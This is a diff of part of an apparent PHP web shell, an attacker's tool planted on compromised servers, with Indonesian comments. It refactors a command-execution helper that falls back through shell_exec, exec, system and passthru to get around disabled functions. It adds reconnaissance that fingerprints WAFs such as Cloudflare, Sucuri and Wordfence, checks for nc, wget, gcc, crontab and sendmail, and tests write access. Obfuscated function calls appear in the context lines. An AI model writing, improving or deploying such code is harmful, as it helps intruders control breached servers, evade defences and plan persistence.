@@ -1381,7 +1381,7 @@ $uname = $GLOBALS['_q_'][20]('php_uname') ? php_uname() : 'N/A';
     </div>
   </div>
 
-  <div id="server-info-modal" class="modal fixed inset-0 bg-black bg-opacity-75 items-center justify-center p-4 z-50">
+<div id="server-info-modal" class="modal fixed inset-0 bg-black bg-opacity-75 items-center justify-center p-4 z-50">
     <div class="bg-gray-800 rounded-lg shadow-xl p-6 w-full max-w-4xl overflow-y-auto max-h-[90vh]">
       <div class="flex justify-between items-center mb-4 border-b border-gray-700 pb-2">
         <h2 class="text-xl text-white font-bold"><i class="fas fa-microchip text-blue-400 mr-2"></i> Server Intelligence
@@ -1390,180 +1390,231 @@ $uname = $GLOBALS['_q_'][20]('php_uname') ? php_uname() : 'N/A';
       </div>
 
       <?php
-// === HELPER: Safe shell command execution (PHP 5.5+ compatible) ===
-function _si_exec($cmd) {
-    // Coba berbagai fungsi shell secara berurutan
-    $result = null;
-    if (function_exists('shell_exec') && !in_array('shell_exec', array_map('trim', explode(',', ini_get('disable_functions'))))) {
-        $result = @shell_exec($cmd);
-    } elseif (function_exists('exec') && !in_array('exec', array_map('trim', explode(',', ini_get('disable_functions'))))) {
-        @exec($cmd, $out);
-        $result = isset($out[0]) ? implode("\n", $out) : null;
-    } elseif (function_exists('system') && !in_array('system', array_map('trim', explode(',', ini_get('disable_functions'))))) {
-        ob_start();
-        @system($cmd);
-        $result = ob_get_clean();
-    } elseif (function_exists('passthru') && !in_array('passthru', array_map('trim', explode(',', ini_get('disable_functions'))))) {
-        ob_start();
-        @passthru($cmd);
-        $result = ob_get_clean();
-    }
-    return ($result !== null && trim($result) !== '') ? trim($result) : false;
-}
+        // =========================================================
+        // HELPER: Safe shell execution (PHP 5.5+ compatible)
+        // Mencoba semua fungsi shell secara berurutan,
+        // tidak fatal jika salah satu di-disable di server
+        // =========================================================
+        function _si_exec($cmd) {
+            $disabled = array_map('trim', explode(',', (string)ini_get('disable_functions')));
+            $result = null;
 
-// === HELPER: Safe binary check (fallback ke is_executable jika shell disabled) ===
-function _si_which($bin) {
-    // Coba shell dulu
-    $r = _si_exec('which ' . escapeshellarg($bin) . ' 2>/dev/null');
-    if ($r !== false) return true;
+            if (function_exists('shell_exec') && !in_array('shell_exec', $disabled)) {
+                $result = @shell_exec($cmd);
+            } elseif (function_exists('exec') && !in_array('exec', $disabled)) {
+                $out = array();
+                @exec($cmd, $out);
+                $result = !empty($out) ? implode("\n", $out) : null;
+            } elseif (function_exists('system') && !in_array('system', $disabled)) {
+                ob_start();
+                @system($cmd);
+                $result = ob_get_clean();
+            } elseif (function_exists('passthru') && !in_array('passthru', $disabled)) {
+                ob_start();
+                @passthru($cmd);
+                $result = ob_get_clean();
+            }
 
-    // Fallback: cek manual di PATH umum
-    $paths = array('/usr/bin', '/usr/local/bin', '/bin', '/sbin', '/usr/sbin', '/usr/local/sbin');
-    foreach ($paths as $p) {
-        if (@is_executable($p . '/' . $bin)) return true;
-    }
-    return false;
-}
+            return ($result !== null && trim($result) !== '') ? trim($result) : false;
+        }
 
-// === DETEKSI WEB SERVER & PANEL ===
-$sSoftware = isset($_SERVER['SERVER_SOFTWARE']) ? $_SERVER['SERVER_SOFTWARE'] : '';
-$sLower    = strtolower($sSoftware);
+        // =========================================================
+        // HELPER: Safe binary check
+        // Fallback ke is_executable() jika semua shell diblokir
+        // =========================================================
+        function _si_which($bin) {
+            // Sanitasi nama binary
+            $bin = preg_replace('/[^a-zA-Z0-9_\-]/', '', $bin);
 
-$webServer = 'Unknown';
-if (strpos($sLower, 'litespeed') !== false)      $webServer = 'LiteSpeed';
-elseif (strpos($sLower, 'apache') !== false)     $webServer = 'Apache';
-elseif (strpos($sLower, 'nginx') !== false)      $webServer = 'Nginx';
+            // Coba via shell dulu
+            $r = _si_exec('which ' . $bin . ' 2>/dev/null');
+            if ($r !== false) return true;
 
-$hosting = 'Standard / Custom';
-if (getenv('CPANEL'))                             $hosting = 'cPanel';
-elseif (@file_exists('/.dockerenv'))              $hosting = 'Docker Container';
-elseif (strpos($sLower, 'litespeed') !== false)  $hosting = 'Shared Hosting (LS)';
+            // Fallback: cek manual di common PATH
+            $paths = array(
+                '/usr/bin', '/usr/local/bin', '/bin',
+                '/sbin', '/usr/sbin', '/usr/local/sbin'
+            );
+            foreach ($paths as $p) {
+                if (@is_executable($p . '/' . $bin)) return true;
+            }
+            return false;
+        }
 
-// === WAF DETECTOR ===
-$wafDetected = 'None / Unknown';
-$wafColor    = 'text-green-500';
+        // =========================================================
+        // DETEKSI WEB SERVER & PANEL
+        // =========================================================
+        $sSoftware = isset($_SERVER['SERVER_SOFTWARE']) ? $_SERVER['SERVER_SOFTWARE'] : '';
+        $sLower    = strtolower($sSoftware);
 
-$headers   = function_exists('getallheaders') ? @getallheaders() : $_SERVER;
-$headerStr = strtolower(@json_encode($headers));
+        $webServer = 'Unknown';
+        if (strpos($sLower, 'litespeed') !== false)      $webServer = 'LiteSpeed';
+        elseif (strpos($sLower, 'apache') !== false)     $webServer = 'Apache';
+        elseif (strpos($sLower, 'nginx') !== false)      $webServer = 'Nginx';
 
-if (isset($_SERVER['HTTP_CF_RAY']) || isset($_SERVER['HTTP_CF_CONNECTING_IP'])) {
-    $wafDetected = 'Cloudflare WAF';
-    $wafColor    = 'text-orange-400';
-} elseif (strpos($headerStr, 'mod_security') !== false || strpos($headerStr, 'f5-traffic') !== false) {
-    $wafDetected = 'ModSecurity / F5';
-    $wafColor    = 'text-red-500';
-} elseif (isset($_SERVER['HTTP_X_SUCURI_ID']) || isset($_SERVER['HTTP_X_SUCURI_CACHE'])) {
-    $wafDetected = 'Sucuri WAF';
-    $wafColor    = 'text-orange-500';
-} elseif (strpos($sLower, 'imunify360') !== false || @file_exists('/etc/sysconfig/imunify360')) {
-    $wafDetected = 'Imunify360';
-    $wafColor    = 'text-red-400';
-} elseif (strpos($headerStr, 'wordfence') !== false) {
-    $wafDetected = 'Wordfence (WAF)';
-    $wafColor    = 'text-blue-400';
-}
+        $hosting = 'Standard / Custom';
+        if (getenv('CPANEL'))                             $hosting = 'cPanel';
+        elseif (@file_exists('/.dockerenv'))              $hosting = 'Docker Container';
+        elseif (strpos($sLower, 'litespeed') !== false)  $hosting = 'Shared Hosting (LS)';
 
-// === PHP HANDLER ===
-$sapi    = php_sapi_name();
-$handler = $sapi;
-if ($sapi == 'apache2handler') $handler = 'mod_php (Apache)';
-elseif ($sapi == 'fpm-fcgi')   $handler = 'PHP-FPM';
-elseif ($sapi == 'cgi-fcgi')   $handler = 'CGI/FastCGI';
-elseif ($sapi == 'litespeed')  $handler = 'LiteSpeed SAPI';
-?>
+        // =========================================================
+        // WAF DETECTOR
+        // =========================================================
+        $wafDetected = 'None / Unknown';
+        $wafColor    = 'text-green-500';
+
+        $headers   = function_exists('getallheaders') ? @getallheaders() : $_SERVER;
+        $headerStr = strtolower((string)@json_encode($headers));
+
+        if (isset($_SERVER['HTTP_CF_RAY']) || isset($_SERVER['HTTP_CF_CONNECTING_IP'])) {
+            $wafDetected = 'Cloudflare WAF';
+            $wafColor    = 'text-orange-400';
+        } elseif (strpos($headerStr, 'mod_security') !== false || strpos($headerStr, 'f5-traffic') !== false) {
+            $wafDetected = 'ModSecurity / F5';
+            $wafColor    = 'text-red-500';
+        } elseif (isset($_SERVER['HTTP_X_SUCURI_ID']) || isset($_SERVER['HTTP_X_SUCURI_CACHE'])) {
+            $wafDetected = 'Sucuri WAF';
+            $wafColor    = 'text-orange-500';
+        } elseif (strpos($sLower, 'imunify360') !== false || @file_exists('/etc/sysconfig/imunify360')) {
+            $wafDetected = 'Imunify360';
+            $wafColor    = 'text-red-400';
+        } elseif (strpos($headerStr, 'wordfence') !== false) {
+            $wafDetected = 'Wordfence (WAF)';
+            $wafColor    = 'text-blue-400';
+        }
+
+        // =========================================================
+        // PHP HANDLER DETECTION
+        // =========================================================
+        $sapi    = php_sapi_name();
+        $handler = $sapi;
+        if ($sapi == 'apache2handler') $handler = 'mod_php (Apache)';
+        elseif ($sapi == 'fpm-fcgi')   $handler = 'PHP-FPM';
+        elseif ($sapi == 'cgi-fcgi')   $handler = 'CGI/FastCGI';
+        elseif ($sapi == 'litespeed')  $handler = 'LiteSpeed SAPI';
+        ?>
 
       <div class="grid grid-cols-1 md:grid-cols-4 gap-4 text-[11px] font-mono">
+
+        <!-- SYSTEM CORE -->
         <div class="bg-gray-900 p-3 rounded border border-gray-700">
           <p class="text-blue-400 font-bold mb-2 border-b border-gray-800 pb-1 uppercase">System Core</p>
           <div class="space-y-1">
             <p class="flex justify-between"><span class="text-gray-500">OS:</span> <span
-                class="text-gray-300 text-right"><?= php_uname('s').' '.php_uname('r'); ?></span></p>
+                class="text-gray-300 text-right"><?php echo htmlspecialchars(php_uname('s') . ' ' . php_uname('r')); ?></span></p>
             <p class="flex justify-between"><span class="text-gray-500">Arch:</span> <span
-                class="text-gray-300"><?= php_uname('m'); ?></span></p>
+                class="text-gray-300"><?php echo htmlspecialchars(php_uname('m')); ?></span></p>
             <p class="flex justify-between"><span class="text-gray-500">PHP SAPI:</span> <span
-                class="text-yellow-500"><?= $handler ?></span></p>
+                class="text-yellow-500"><?php echo htmlspecialchars($handler); ?></span></p>
             <p class="flex justify-between"><span class="text-gray-500">Web Srv:</span> <span
-                class="text-gray-300"><?= $webServer ?></span></p>
+                class="text-gray-300"><?php echo htmlspecialchars($webServer); ?></span></p>
             <p class="flex justify-between"><span class="text-gray-500">Panel:</span> <span
-                class="text-blue-400"><?= $hosting ?></span></p>
+                class="text-blue-400"><?php echo htmlspecialchars($hosting); ?></span></p>
             <p class="flex justify-between"><span class="text-gray-500">HTTPS:</span> <span
-                class="text-gray-300"><?= (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'YES' : 'NO' ?></span>
+                class="text-gray-300"><?php echo (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'YES' : 'NO'; ?></span>
             </p>
             <p class="flex justify-between"><span class="text-gray-500">WAF:</span> <span
-                class="<?= $wafColor ?> font-bold"><?= $wafDetected ?></span></p>
+                class="<?php echo $wafColor; ?> font-bold"><?php echo htmlspecialchars($wafDetected); ?></span></p>
           </div>
         </div>
 
+        <!-- CAPABILITIES -->
         <div class="bg-gray-900 p-3 rounded border border-gray-700">
           <p class="text-orange-400 font-bold mb-2 border-b border-gray-800 pb-1 uppercase">Capabilities</p>
           <div class="space-y-1">
             <?php
-              $cron     = _si_which('crontab');
-              $mail     = function_exists('mail') && (strpos((string)ini_get('sendmail_path'), 'sendmail') !== false || _si_which('sendmail'));
-              $testFile = (isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : sys_get_temp_dir()) . '/.3wgf_tmp';
-              $immutable = !@file_put_contents($testFile, '1');
-              @unlink($testFile);
+            // Crontab check via _si_which (aman, tidak fatal)
+            $cron = _si_which('crontab');
+
+            // Mailer check
+            $mail = function_exists('mail') && (
+                strpos((string)ini_get('sendmail_path'), 'sendmail') !== false ||
+                _si_which('sendmail')
+            );
+
+            // Immutable check: coba tulis file test
+            $docRoot  = isset($_SERVER['DOCUMENT_ROOT']) && $_SERVER['DOCUMENT_ROOT'] !== ''
+                        ? $_SERVER['DOCUMENT_ROOT']
+                        : sys_get_temp_dir();
+            $testFile = rtrim($docRoot, '/') . '/.3wgf_tmp';
+            $immutable = !@file_put_contents($testFile, '1');
+            @unlink($testFile);
             ?>
             <p class="flex justify-between"><span class="text-gray-500">Crontab:</span> <span
-                class="<?= $cron?'text-green-400':'text-red-500' ?>"><?= $cron?'YES':'NO' ?></span></p>
+                class="<?php echo $cron ? 'text-green-400' : 'text-red-500'; ?>"><?php echo $cron ? 'YES' : 'NO'; ?></span></p>
             <p class="flex justify-between"><span class="text-gray-500">Mailer:</span> <span
-                class="<?= $mail?'text-green-400':'text-red-500' ?>"><?= $mail?'YES':'NO' ?></span></p>
+                class="<?php echo $mail ? 'text-green-400' : 'text-red-500'; ?>"><?php echo $mail ? 'YES' : 'NO'; ?></span></p>
             <p class="flex justify-between"><span class="text-gray-500">Immutable:</span> <span
-                class="<?= $immutable?'text-red-500':'text-green-400' ?>"><?= $immutable?'YES':'NO' ?></span></p>
+                class="<?php echo $immutable ? 'text-red-500' : 'text-green-400'; ?>"><?php echo $immutable ? 'YES' : 'NO'; ?></span></p>
           </div>
         </div>
 
+        <!-- PHP CONFIGURATION -->
         <div class="bg-gray-900 p-3 rounded border border-gray-700">
           <p class="text-green-400 font-bold mb-2 border-b border-gray-800 pb-1 uppercase">PHP Configuration</p>
           <div class="space-y-1">
             <p class="flex justify-between"><span class="text-gray-500">Memory Limit:</span> <span
-                class="text-gray-300"><?= ini_get('memory_limit') ?></span></p>
+                class="text-gray-300"><?php echo htmlspecialchars((string)ini_get('memory_limit')); ?></span></p>
             <p class="flex justify-between"><span class="text-gray-500">Max Exec:</span> <span
-                class="text-gray-300"><?= ini_get('max_execution_time') ?>s</span></p>
+                class="text-gray-300"><?php echo htmlspecialchars((string)ini_get('max_execution_time')); ?>s</span></p>
             <p class="flex justify-between"><span class="text-gray-500">Max Upload:</span> <span
-                class="text-gray-300"><?= ini_get('upload_max_filesize') ?></span></p>
+                class="text-gray-300"><?php echo htmlspecialchars((string)ini_get('upload_max_filesize')); ?></span></p>
             <p class="flex justify-between"><span class="text-gray-500">Post Max:</span> <span
-                class="text-gray-300"><?= ini_get('post_max_size') ?></span></p>
+                class="text-gray-300"><?php echo htmlspecialchars((string)ini_get('post_max_size')); ?></span></p>
             <p class="flex justify-between"><span class="text-gray-500">Input Vars:</span> <span
-                class="text-gray-300"><?= ini_get('max_input_vars') ?></span></p>
+                class="text-gray-300"><?php echo htmlspecialchars((string)ini_get('max_input_vars')); ?></span></p>
           </div>
         </div>
 
+        <!-- CRITICAL EXTENSIONS -->
         <div class="bg-gray-900 p-3 rounded border border-gray-700">
           <p class="text-purple-400 font-bold mb-2 border-b border-gray-800 pb-1 uppercase">Critical Extensions</p>
           <div class="grid grid-cols-2 gap-x-2">
-            <?php 
-                    $exts = ['pdo','curl','openssl','mbstring','json','gd','zip'];
-                    foreach($exts as $e) {
-                        $loaded = extension_loaded($e);
-                        echo "<div class='flex justify-between'><span class='text-gray-500'>$e:</span> <span class='".($loaded?'text-green-400':'text-red-500')."'>".($loaded?'OK':'NO')."</span></div>";
-                    }
-                    ?>
+            <?php
+            $exts = array('pdo','curl','openssl','mbstring','json','gd','zip');
+            foreach ($exts as $e) {
+                $loaded = extension_loaded($e);
+                echo "<div class='flex justify-between'>";
+                echo "<span class='text-gray-500'>" . htmlspecialchars($e) . ":</span> ";
+                echo "<span class='" . ($loaded ? 'text-green-400' : 'text-red-500') . "'>" . ($loaded ? 'OK' : 'NO') . "</span>";
+                echo "</div>";
+            }
+            ?>
           </div>
         </div>
 
+        <!-- DISABLED FUNCTIONS -->
         <div class="bg-gray-900 p-3 rounded border border-gray-700 md:col-span-4">
           <p class="text-red-400 font-bold mb-1 uppercase">Security / Disabled Functions</p>
           <div class="text-[10px] text-gray-400 break-all bg-black p-2 rounded border border-gray-800">
-            <?= ini_get('disable_functions') ?: '<span class="text-green-500 italic">None - Server is highly exploitable</span>'; ?>
+            <?php
+            $disabledFn = (string)ini_get('disable_functions');
+            if ($disabledFn !== '') {
+                echo htmlspecialchars($disabledFn);
+            } else {
+                echo '<span class="text-green-500 italic">None - Server is highly exploitable</span>';
+            }
+            ?>
           </div>
         </div>
 
+        <!-- SOFTWARE AVAILABILITY -->
         <div class="bg-gray-900 p-3 rounded border border-gray-700 md:col-span-4">
           <p class="text-yellow-400 font-bold mb-1 uppercase text-center">Software Availability (Binary Check)</p>
           <div class="grid grid-cols-2 md:grid-cols-5 gap-2 text-[10px] mt-2">
             <?php
-              $bins = array('python','perl','ruby','bash','gcc','curl','wget','nc','crontab','sendmail');
-              foreach ($bins as $b) {
-                  $isAvail = _si_which($b);
-                  echo "<div class='flex justify-between bg-black p-1 px-2 rounded border border-gray-800'>";
-                  echo "<span class='text-gray-500'>" . htmlspecialchars($b) . "</span>";
-                  echo "<span class='" . ($isAvail ? 'text-green-400' : 'text-red-600') . " font-bold'>" . ($isAvail ? 'YES' : 'NO') . "</span>";
-                  echo "</div>";
-              }
+            $bins = array('python','perl','ruby','bash','gcc','curl','wget','nc','crontab','sendmail');
+            foreach ($bins as $b) {
+                $isAvail = _si_which($b);
+                echo "<div class='flex justify-between bg-black p-1 px-2 rounded border border-gray-800'>";
+                echo "<span class='text-gray-500'>" . htmlspecialchars($b) . "</span>";
+                echo "<span class='" . ($isAvail ? 'text-green-400' : 'text-red-600') . " font-bold'>" . ($isAvail ? 'YES' : 'NO') . "</span>";
+                echo "</div>";
+            }
             ?>
           </div>
         </div>
+
       </div>
 
       <div class="mt-4 flex justify-end">
